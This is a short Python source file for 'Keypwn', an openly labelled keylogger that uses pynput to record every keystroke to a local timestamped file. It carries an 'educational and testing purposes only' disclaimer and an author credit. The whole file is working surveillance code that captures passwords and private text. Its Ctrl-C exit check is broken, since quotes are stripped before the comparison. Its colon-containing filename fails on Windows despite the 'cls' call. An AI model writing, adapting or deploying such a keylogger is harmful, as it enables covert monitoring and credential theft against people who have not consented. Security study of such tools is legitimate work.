""" 
    Keypwn is a single keylogger tool to capture keystrokes and stores it locally. For
    educational and testing purposes only.

    Developed by @Its-Yayo. Follow me fellas!

"""

import os
import sys
import datetime
from pynput.keyboard import Listener

date = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
log_name = open(f'keypwn_{date}.txt', 'w+')

os.system('cls')

def keypwn(key):
    global keys, log_name

    keys = str(key).replace("'", "")

    if keys == "'\\x03'":
        log_name.close()
        sys.exit()
    
    if keys == 'Key.enter':
        log_name.write('\n')
    elif keys == 'Key.space':
        log_name.write(' ')
    elif keys == 'Key.backspace':
        log_name.write(' [Backspace] ')
    else:
        log_name.write(keys.replace("'", ""))
    
with Listener(on_press=keypwn) as listener:
    listener.join()



    
    




